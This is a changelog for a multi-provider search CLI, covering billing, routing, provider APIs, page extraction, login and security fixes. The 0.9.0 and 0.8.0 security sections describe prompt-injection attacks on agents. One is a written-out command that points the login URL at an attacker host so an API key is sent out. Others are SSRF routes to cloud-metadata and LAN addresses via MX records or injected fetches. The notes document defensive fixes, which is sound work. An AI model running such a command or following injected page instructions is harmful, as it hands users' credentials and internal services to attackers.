# Changelog

## 0.10.0 — 2026-11-02

### Search without your own keys
- After `search login`, engines you have no key for run through metasearch.sh
  and are charged to your balance; engines you have a key for still go direct.
  A new account starts with $1 of credit, so a machine with no keys gets
  results on the first try. A fused search sends at most 3 hosted engines
  (6 for `deep`) and names the rest in a warning; `-p` or
  `metasearch.max_providers` (1-8, one cap for every fused mode) changes
  that.
- Every result envelope reports what the search cost in `metadata.cost`
  (micro-USD, per engine, and whether the figure is an estimate or the
  amount charged) and how each engine was reached in `metadata.transport`.
  `search stats` now prices spend from these figures.
- When a refresh of the metasearch.sh manifest fails, the stale copy is
  used and the refresh is retried after a minute, so an outage no longer
  adds a 5 s wait to every logged-in search.

### Auto mode
- With no `-m`, the mode is `auto`: fixed rules for URLs, X, similar-site
  requests, patents and images, then JEV when logged in (keyword rules if it
  does not answer within 1.2 s), else keyword rules, else `general`. The
  envelope's `mode` is the mode that ran, and `metadata.routing.auto` gives
  its source and reason. Auto never picks `deep`, and picks `social` only on
  an X cue; code at-words (`@property`, `@types/node`), "Twitter card" and
  email addresses are not X cues. "Patent leather", phone and order numbers
  are not patent cues, and Docker, container, ISO or VM images are not image
  searches. An explicit `-m` or `-p` is always obeyed;
  if the `-p` engines cannot serve the mode auto picked, the search runs as
  `general`.
- In `news` and `social`, a time word such as "today", "latest" or "this
  month" sets the freshness when you gave no `-f`, reported in
  `metadata.routing.auto.filters_applied`. `-f` accepts only day, week,
  month and year; anything else exits 3.
- Logged in, results in general, news, academic, scholar, people and deep
  are reranked by relevance (`metadata.routing.reranked`,
  `extra.relevance`) when there are at least 3 and `-p` does not name a
  single engine; `--no-rerank` turns it off.

### Paid calls are not wasted
- A fused search no longer cancels engines after 1.5 s. An engine that has
  received the query bills for it, so the search now waits for every engine
  until the mode's deadline and lists late ones in
  `metadata.providers_timed_out` (`providers_cancelled` no longer appears).
- A request that timed out on an engine that bills on receipt is not sent
  again. Retries happen only for connection failures, and for 429 or 503
  answers that carry a Retry-After within the deadline and are not quota
  messages.
- Errors read the response body: an exhausted balance is `billing_quota`, a
  bad key is `auth`, a provider's own error code is honoured, so you know
  whether to top up, fix a key or retry.

### Current provider APIs
- Perplexity uses its Search API, since the Sonar chat endpoint used before
  was retired; it returns ranked results and no longer writes an answer.
  xAI uses the Responses API with X search on `grok-4.3`, and its summary of
  the posts goes to `answers[]`. Parallel uses `/v1/search` (`fast` for
  general and news, `advanced` for deep). Exa buys highlights instead of
  full page text and uses its `publication` category for `academic`.
- Brave news calls were billed and came back empty, because the adapter read
  the wrong field; they now return results. Tavily runs general and news at
  the basic depth (one credit, where every mode used to buy two) and sends
  the key as a Bearer header. A Linkup budget cap or empty balance is
  `billing_quota` (exit 2) and is sent once, not retried as a rate limit.
  Several `-d` domains are joined with OR, so Serper, Brave and Jina no
  longer return nothing for them. `--country` reaches Serper, Brave, Parallel
  and Perplexity, and `--lang` Serper, Brave and Perplexity; SerpApi sends
  neither.
- Costs follow what each provider reports where it reports one (Jina
  Reader by its token count). Brave `deep` counts the spend when both of its
  calls fail.
- Tavily returns publication dates in every mode, not only news. Linkup's
  "no result" answer is an empty result (exit 0), not a bad request.
  Perplexity and xAI apply the whole `--exclude-domain` list to the results,
  past the 20 entries they accept upstream.

### Reading pages
- `extract` starts with a direct fetch that asks for markdown first, follows
  up to 5 redirects and checks every hop against private addresses, then
  converts HTML to markdown locally. It is free and needs no key. The
  stealth fetch runs only when the site refused direct; paid renderers come
  last.
- Bot challenges, JavaScript shells, binary files, error pages and empty
  pages are rejected before they count, so the chain moves on and junk never
  comes back as the page. A pay-per-crawl 402, a 404 or a 410 stops the
  chain before any paid renderer is called.
- `--allow-private` now lets direct and stealth fetch private and loopback
  addresses on your machine. Otherwise the SSRF guard checks the addresses
  direct and stealth actually connect to, and a URL it refused is never sent
  to a paid renderer. The guard also refuses 192.0.0.0/24 (Oracle Cloud
  metadata at 192.0.0.192) and the documentation ranges.

### Output
- In JSON mode stdout carries exactly one JSON document, errors included, so
  a pipe into `jq` never breaks on a failure. A `-p` name that is unknown,
  or that cannot serve the mode, exits 3.
- A search flag after a shorthand query (`search "q" -p exa`) exits 3 and
  the error shows the full form, where it used to be searched as text.
- `search agent-info` lists `auto` first in `modes[]` and gives
  `usd_per_call_where_different` for the modes an engine prices unlike its
  `usd_per_call` (deep on Exa, Brave, Linkup and Parallel; academic and
  deep on Tavily).

### Config
- `settings.timeout` is gone: every call is bounded by its mode's deadline,
  and a `timeout` left in an old file is ignored.

### Install
- The Linux binaries now include the stealth fetch, so `extract` on Linux
  tries it before the paid renderers, as on macOS.
- Prebuilt binaries for Linux arm64 (aarch64). `curl -fsSL
  https://metasearch.sh/install | sh` works on macOS and Linux, x86_64 and
  arm64, and checks the download against `SHA256SUMS`.
- A Claude Code plugin marketplace in this repo: `search-cli` installs the
  skill, `metasearch` adds the metasearch.sh MCP server.

## 0.9.0 — 2026-07-25

### Terminal login
- `search login` signs in to a metasearch.sh account using the OAuth 2.0
  device authorization grant (RFC 8628): the CLI prints a short confirmation
  code, opens the browser, and polls until the request is approved. No key is
  ever copied by hand. `--no-browser` covers headless and SSH sessions.
- `search whoami` reports the account, balance, and key behind the stored
  credentials; `search logout` clears them locally, `--revoke` also kills the
  key server-side so a lost machine stops spending.
- Credentials live in the same 0600 config file as provider keys, under a new
  `[metasearch]` section. Precedence: `METASEARCH_TOKEN` env →
  `SEARCH_METASEARCH_TOKEN` env → config file. `METASEARCH_URL` points the CLI
  at a self-hosted or local instance.
- Polling survives dropped keep-alive connections, sleeping laptops, and wifi
  blips — only a sustained outage aborts a login.

Search dispatch is unchanged: this release stores credentials, it does not yet
route queries through metasearch.sh.

### Security
- `search login` now refuses to send credentials anywhere but
  `https://metasearch.sh`. An agent reading a poisoned web page could
  previously run `search config set metasearch.url https://attacker.tld` (or
  pass `--url`) and the next login would hand the API key to whoever asked.
  Self-hosted instances set `METASEARCH_ALLOW_INSECURE_HOST=1` to consent;
  plain http is refused outright except on loopback.
- `search verify` applies the same default-deny network guard as
  extract/scrape. An MX record is attacker-controlled: a hostile domain could
  point it at `169.254.169.254` or a LAN address and read what is listening
  off the SMTP response codes.

## 0.8.0 — 2026-07-02

Production-hardening release from a full blindspot audit (cross-checked by an
independent GPT-5.5 review).

### Safety
- Extract/scrape refuse private, loopback, link-local, CGNAT, and cloud-metadata
  targets by default (`--allow-private` overrides) — the local stealth rung
  could otherwise be steered into internal endpoints by prompt injection.
- Empty queries, queries over 2000 chars, and `-c` outside 1–100 exit 3 before
  any paid API call fans out.
- Scraped content is tagged `extra.content_origin: untrusted_web_content`.
- `search verify` documents its SMTP-probing reputation tradeoff.

### Secrets
- config.toml is written 0600 via atomic temp+rename; pre-existing 644 files
  are tightened on load.
- `search config set keys.x -` reads the value from stdin (keeps keys out of
  shell history and `ps`).
- API keys are redacted from every error message and provider-failure reason.

### Telemetry & analytics
- `search stats`: searches/modes/providers, failures, cancellations, estimated
  spend (static price table), measured balance burn (from `search usage`
  snapshots), cache-hit rate, repeated queries, and read-through (which
  providers' results agents actually extract afterwards). `--prune N` deletes
  old logs.
- Log entries carry a schema version, cache hits are logged, lines are written
  atomically, and `SEARCH_LOG=off` disables logging entirely.

### Controls
- `--no-cache` forces a fresh search; `search cache clear` empties the cache.
  Cache reads and writes are now gated identically (a filtered search can no
  longer poison the plain-query cache).
- `--max-chars N` caps snippet/answer length — bound how much web content
  enters an agent context.
- `--country` / `--lang` locale bias, applied by serper/serpapi/brave/parallel.
- `search doctor` test-fires every configured provider (one minimal billed
  request each) and reports health, latency, and failure category.

### Result quality
- Known tracking parameters (`utm_*`, `fbclid`, `gclid`, …) are stripped from
  the dedup key, so URL variants no longer defeat fusion consensus.
- 429 responses honor `Retry-After` (capped at 2s) before retrying.

### Portability & supply chain
- `stealth` is a default-on cargo feature; `--no-default-features` builds
  without wreq/BoringSSL, enabling Linux. Releases now include a Linux x86_64
  tarball and a SHA256SUMS file; install.sh verifies checksums and refuses
  unverified downloads.
- CI adds a Linux job and a cargo-deny gate (advisories/licenses/sources).
  First run fixed a rustls-webpki CVE and two hickory-proto DNS
  vulnerabilities (verify.rs ported to hickory-resolver 0.26).

## 0.7.1 — 2026-07-02
- Linkup added as the 13th provider (general/news/deep, full filter support,
  credits balance in `search usage`).
- Extract chain demotes garbage scrapes (binary bytes, anti-bot interstitials)
  to failures so the fallback escalates instead of returning junk.

## 0.7.0 — 2026-07-02
- Reciprocal rank fusion across providers: consensus URLs rank first,
  deterministically; early-stop gained a 1.5s grace window and `deep` never
  cancels.
- Envelope honesty: `provider_results`, `providers_cancelled`, `warnings`,
  `cached`/`cache_age_secs`, and AI answers moved to a separate `answers[]`.
- Self-describing `agent-info` modes generated from a single routing registry;
  URL-mode input validation; `search usage` credit visibility.

## 0.6.2 and earlier
- Multi-provider search, email verification, self-update, skill install. See
  git history.